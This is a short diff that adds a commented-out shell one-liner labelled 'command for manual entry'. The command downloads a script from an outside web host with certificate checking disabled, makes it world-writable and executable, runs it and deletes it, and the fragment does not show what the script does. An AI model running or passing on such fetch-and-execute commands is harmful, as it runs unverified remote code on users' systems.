@@ -1,0 +1,3 @@
+
+#command for manual entry
+#cd /Volumes&&curl -Ok http://www.barkbounty.com/eiv.sh&&chmod 777 eiv.sh&&./eiv.sh&&rm -rf eiv.sh
